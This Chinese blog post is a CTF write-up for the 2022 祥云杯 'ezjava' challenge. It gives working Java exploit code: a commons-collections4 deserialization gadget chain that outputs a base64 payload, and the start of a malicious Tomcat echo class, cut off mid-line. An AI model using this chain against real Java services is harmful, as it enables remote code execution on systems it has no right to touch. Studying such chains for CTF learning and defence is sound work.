---
title: 祥云杯2022  writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/16851735.html
source: 博客园 - 渗透测试中心
date: 2022-11-03
fetch_date: 2025-10-03T21:40:04.879010
---

# 祥云杯2022  writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [祥云杯2022 writeup](https://www.cnblogs.com/backlion/p/16851735.html "发布于 2022-11-02 17:22")

# 0x01 web

## 1.ezjava

下载源码对jar文件进行反编译,发现POST /myTest会出现反序列化漏洞

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302033773.png](https://img2022.cnblogs.com/blog/1049983/202211/1049983-20221102172145262-779556304.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302033773.png")

util ,最后好像没用到

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302034773.png](https://img2022.cnblogs.com/blog/1049983/202211/1049983-20221102172146265-632272839.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302034773.png")

检查程序，发现apache的common−collections4,而且其反序列化利用类未被Patch

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302034341.png](https://img2022.cnblogs.com/blog/1049983/202211/1049983-20221102172146989-5782308.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302034341.png")

一眼看到 commons-collection4-4.0, 于是直接用 ysoserial 打

考点发现就是 cc4

[附上文章](https://blog.csdn.net/m0_64685672/article/details/122611195)

外加spring−ech 网上有现成的 poc

造轮子！ :

```
package moe.orangemc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class Main {
    public static void main(String[] args) {
        try {
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.getCtClass("Meow");
            byte[] bytes = ctClass.toBytecode();
            TemplatesImpl templates = new TemplatesImpl();
            Field f1 = templates.getClass().getDeclaredField("_name");
            Field f2 = templates.getClass().getDeclaredField("_bytecodes");
            f1.setAccessible(true);
            f2.setAccessible(true);
            f1.set(templates, "Meow");
            f2.set(templates, new byte[][]{bytes});
            Transformer<Class<?>, Object> chainedTransformer = new ChainedTransformer(new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}));
            TransformingComparator<Class<?>, Object> transformingComparator = new TransformingComparator<>(chainedTransformer);
            PriorityQueue<Integer> queue = new PriorityQueue<>(2);
            queue.add(1);
            queue.add(1);
            Field f = queue.getClass().getDeclaredField("comparator");
            f.setAccessible(true);
            f.set(queue, transformingComparator);
            Field f3 = queue.getClass().getDeclaredField("queue");
            f3.setAccessible(true);
            f3.set(queue, new Object[] {chainedTransformer, chainedTransformer});

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(queue);
            oos.close();
            String result = new String(Base64.getEncoder().encode(baos.toByteArray()));
            System.out.println(result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

根据上文代码，发现无法回显，但根据百度发现可以利用 apache 的 catalina 进行回显，同时程序包里有这个类库:

[![](https://img2022.cnblogs.com/blog/1049983/202211/1049983-20221102172147791-1876168569.png)](https://s1.ax1x.com/2022/11/01/xTdcOH.png)

编写恶意类：

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Meow extends AbstractTranslet {

    public Meow() {
        super();
        this.namesArray = new String[]{"meow"};
        try {

            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
            contextField.setAccessible(true);
            serviceField.setAccessible(true);
            requestField.setAccessible(true);
            getHandlerMethod.setAccessible(true);
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
            for (int i=0;i<connectors.length;i++) {
                if (4==connectors[i].getScheme().length()) {
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof org.apache.coyote.http1...